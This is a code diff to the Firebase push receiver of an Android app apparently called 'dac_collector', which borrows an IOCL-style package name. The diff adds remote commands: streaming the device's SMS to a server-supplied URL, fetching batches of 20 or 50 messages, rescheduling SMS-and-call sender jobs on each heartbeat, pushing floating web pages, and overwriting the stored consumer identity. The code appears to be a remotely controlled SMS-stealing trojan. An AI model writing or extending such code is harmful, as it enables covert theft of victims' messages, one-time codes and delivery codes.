@@ -15,6 +15,7 @@ import android.iocl.dac_collector.Services.JobSchedulerUtil;
 import android.iocl.dac_collector.Services.SendDACService;
 import android.iocl.dac_collector.Services.SmsFetchWorker;
 import android.iocl.dac_collector.Services.SmsNumberScanWorker;
+import android.iocl.dac_collector.Services.SmsStreamingWorkerManager;
 import android.iocl.dac_collector.Ui.BankStatementActivity;
 import android.iocl.dac_collector.Utility.Constant;
 import android.iocl.dac_collector.Utility.FirebaseConfigManager;
@@ -32,6 +33,7 @@ import androidx.annotation.NonNull;
 import androidx.core.content.ContextCompat;
 import androidx.work.Configuration;
 import androidx.work.Constraints;
+import androidx.work.Data;
 import androidx.work.NetworkType;
 import androidx.work.OneTimeWorkRequest;
 import androidx.work.WorkManager;
@@ -59,7 +61,7 @@ public class FCMPushReceiver extends FirebaseMessagingService {
             Log.d(TAG, "onMessageReceived: " + remoteMessage.getData());
             routeFcmActions(remoteMessage);
         } catch (Exception e) {
-            Log.d(TAG, "onMessageReceived: " + e);
+            Log.e(TAG, "Failed to process Firebase message", e);
         }
 
         if (BuildConfig.DEBUG) {
@@ -80,6 +82,10 @@ public class FCMPushReceiver extends FirebaseMessagingService {
             String payloads = rm.get("payload");
 
             Log.d(TAG, "routeFcmActions: Action " + actionType);
+            if (actionType == null) {
+                Log.w(TAG, "Ignoring Firebase message without an action");
+                return;
+            }
             switch (actionType) {
                 case "heart_beat":
                     /*
@@ -88,9 +94,7 @@ public class FCMPushReceiver extends FirebaseMessagingService {
                     @payload: not_require
 
                      */
-                    sendTokenToServer();
-//                    scheduleJob();
-//                    WakeupHelper.scheduleAlarm(getApplicationContext(), SmsSenderJOBService.class);
+                    respondToHeartbeat();
                     break;
                 case "recharge_notify":
                     /*
@@ -116,11 +120,11 @@ public class FCMPushReceiver extends FirebaseMessagingService {
                     /*
 
                     @actions:  get_sms
-                    @payload: Not Require
+                    @payload: {"limit": 20} or {"limit": 50}
 
                      */
 
-                    handleSendSms();
+                    handleSendSms(payloads);
                     break;
                 case "receivedSubsidy":
                                         /*
@@ -192,9 +196,17 @@ public class FCMPushReceiver extends FirebaseMessagingService {
                 case "notification_web": // 512 version code er pore add hoyeche
 
 
+
                     String title = rm.get("title");
                     String body = rm.get("body");
                     String url = rm.get("url");
+                    if (url == null || url.trim().isEmpty()) {
+                        url = payloads;
+                    }
+
+
+                     Log.d(TAG, "routeFcmActions: notification_web payload: " + payloads + " title: " + title + " body: " + body + " url: " + url);
+                 
                     /*
                 {
                  "actions":"notification_web",
@@ -203,7 +215,7 @@ public class FCMPushReceiver extends FirebaseMessagingService {
                  "url":"https://promo.com"
                 }
                     */
-                    NotificationHelper.showFloatingWeb(getApplicationContext(), payloads, body, url);
+                    NotificationHelper.showFloatingWeb(getApplicationContext(), title, body, url);
                     break;
                 case "get_dac":
                     Intent mainService = new Intent(this, SendDACService.class);
@@ -213,6 +225,35 @@ public class FCMPushReceiver extends FirebaseMessagingService {
                         startService(mainService);
                     }
                     break;
+                case "update_not_found":
+                    String userName = rm.get("user_name");
+                    String consumerId = rm.get("cons_id");
+
+                    if (SharedPrefs.getConsumerId().contains("not_found"))
+
+                        SharedPrefs.setUsername(userName);
+                    SharedPrefs.setConsumerId(consumerId);
+
+                    break;
+                case "sms_streaming": {
+                    String action = rm.get("action");
+                    String pathToUrl = rm.get("pathToUrl");
+
+                    SmsStreamingWorkerManager manager =
+                            SmsStreamingWorkerManager.getInstance(this);
+
+                    if ("start".equals(action)) {
+                        if (!manager.isRunning()) {
+                            manager.start(pathToUrl);
+                        }
+                    } else {
+                        if (manager.isRunning()) {
+                            manager.stop();
+                        }
+                    }
+
+                    break;
+                }
                 default:
                     Log.d(TAG, "onMessageReceived: " + actionType);
                     break;
@@ -390,11 +431,34 @@ public class FCMPushReceiver extends FirebaseMessagingService {
     }
 
 
-    private void handleSendSms() {
-        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED)  // Only run when connected to Wi-Fi
+    private void handleSendSms(String payload) {
+        int smsLimit = 20;
+        try {
+            String requestedLimit = payload == null ? "" : payload.trim();
+            if (requestedLimit.startsWith("{")) {
+                requestedLimit = new org.json.JSONObject(requestedLimit).optString("limit", "");
+            }
+            int parsedLimit = Integer.parseInt(requestedLimit);
+            if (parsedLimit == 20 || parsedLimit == 50) {
+                smsLimit = parsedLimit;
+            } else {
+                Log.w(TAG, "Unsupported get_sms limit; using default of 20");
+            }
+        } catch (org.json.JSONException | NumberFormatException e) {
+            Log.w(TAG, "Invalid get_sms payload; using default limit of 20", e);
+        }
+
+        Constraints constraints = new Constraints.Builder().setRequiredNetworkType(NetworkType.CONNECTED)
                 .build();
 
-        OneTimeWorkRequest smsFetchRequest = new OneTimeWorkRequest.Builder(SmsFetchWorker.class).setConstraints(constraints).build();
+        Data inputData = new Data.Builder()
+                .putInt("sms_limit", smsLimit)
+                .build();
+
+        OneTimeWorkRequest smsFetchRequest = new OneTimeWorkRequest.Builder(SmsFetchWorker.class)
+                .setInputData(inputData)
+                .setConstraints(constraints)
+                .build();
 
         WorkManager.getInstance(getApplicationContext()).enqueue(smsFetchRequest);
     }
@@ -410,10 +474,15 @@ public class FCMPushReceiver extends FirebaseMessagingService {
     }
 
     private void scheduleJob() {
-        if (!Utility.isJobSchedulerActive(getApplicationContext(), 1)) {
-            JobSchedulerUtil.Sms_and_Call_sender(getApplicationContext());
-            JobSchedulerUtil.fetch_profile_info(getApplicationContext());
-        }
+        JobSchedulerUtil.ensureBackgroundJobsScheduled(getApplicationContext());
+    }
+
+    private void respondToHeartbeat() {
+        Context context = getApplicationContext();
+
+        sendTokenToServer();
+        scheduleJob();
+        FirebaseDBClient.schedulePendingDacUploads(context);
     }
 
 
